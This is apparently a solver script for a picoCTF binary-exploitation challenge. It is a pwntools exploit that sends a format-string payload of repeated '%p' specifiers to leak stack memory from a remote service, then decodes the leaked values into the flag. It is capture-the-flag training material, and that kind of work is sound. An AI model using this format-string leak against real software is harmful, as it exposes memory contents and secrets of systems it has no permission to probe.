from pwn import *
import string

# context(arch="i386", os="linux")

elf = ELF("./vuln", checksec=False)
p = elf.process()
p = remote('mercury.picoctf.net', '27912')

p.recvuntil("portfolio")
p.sendlines("1")

p.recvuntil("What is your API token?\n")
p.sendline("|".join(["%p"] * 40))

p.recvuntil('Buying stonks with token:\n')
leak = p.recvline()
leak = leak.split("|")

flag = ""
for l in leak:
	try:
		l = l[2:].decode("hex")
		if all(i in string.printable for i in l):
			flag += l[::-1] 
	except:
		continue

print '\nFlag Received: ', flag